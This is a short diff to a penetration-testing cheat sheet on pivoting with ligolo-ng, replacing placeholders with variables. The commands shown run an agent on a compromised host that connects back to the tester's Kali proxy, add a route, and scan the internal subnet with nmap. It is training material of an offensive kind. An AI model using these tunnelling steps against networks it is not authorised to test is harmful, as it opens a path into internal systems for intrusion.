@@ -26,7 +26,7 @@ sudo ip link set ligolo up
 ./proxy -selfcert
 
 # On the compromised target, run the agent, connecting back to the proxy
-./agent -connect <kali_ip>:11601 -ignore-cert
+./agent -connect $LocalIP:11601 -ignore-cert
 
 # Back on Kali, inside the ligolo-ng console: select the session, then add the route
 session
@@ -37,7 +37,7 @@ start                             # begins relaying traffic through the TUN inte
 # Then, in a separate terminal, add a route to the newly-reachable subnet
 sudo ip route add <internal_subnet>/24 dev ligolo
 ```
-*Once the route's added, tools just work against the internal subnet directly, `nmap -sT <internal_target>` with no `proxychains` prefix needed, since the traffic genuinely routes through the real `ligolo` TUN interface rather than being SOCKS-proxied per-application.*
+*Once the route's added, tools just work against the internal subnet directly, `nmap -sT $BoxIP` with no `proxychains` prefix needed, since the traffic genuinely routes through the real `ligolo` TUN interface rather than being SOCKS-proxied per-application.*
 
 #### Tags: #ModernTooling #LigoloNg #Pivoting #Tunneling #TunInterface
 ## External Resources
